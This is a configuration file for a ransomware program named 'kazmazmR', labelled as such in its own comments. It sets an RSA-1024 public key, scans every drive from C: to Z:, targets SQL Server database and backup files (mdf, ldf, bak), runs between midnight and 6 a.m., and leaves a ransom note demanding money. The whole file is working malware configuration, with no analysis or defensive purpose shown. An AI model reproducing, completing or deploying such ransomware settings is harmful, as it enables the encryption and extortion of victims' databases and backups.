# Cryptography Settings
RSA_key_bit_size = 1024  # Can be square by 1024
main_public_key_P1 = 110806462959167326370319341286486319872457173234569812929686398604612581838812473965789958578930581615816499559192968594070764563542402471260387234210374505849590883063541067935845209652250220128233914194342345679653233986127964539406610497684023499878669696009130736667378612268124371200340174549463400283257
main_public_key_P2 = 65537
path_of_private_key = '/private.pem.enc'
# search_partitions = ['.']
search_partitions = [
    "C:",
    "D:",
    "E:",
    "F:",
    "G:",
    "H:",
    "I:",
    "J:",
    "K:",
    "L:",
    "M:",
    "N:",
    "O:",
    "P:",
    "Q:",
    "R:",
    "S:",
    "T:",
    "U:",
    "V:",
    "W:",
    "X:",
    "Y:",
    "Z"
]

# Ransomware
ransomware_name = 'kazmazmR'
start_hour = 0
end_hour = 6
check_hour_interval = 120  # Sec
file_extensions = [
    'mdf',
    'ldf',
    'bak'
]
save_key_file = f"/recovery-data-codes.{ransomware_name}"
message_file = '/README.txt'
readme_message = """
We're hacked you, I need money ;/
Be poolesh fekr vakonim!
"""
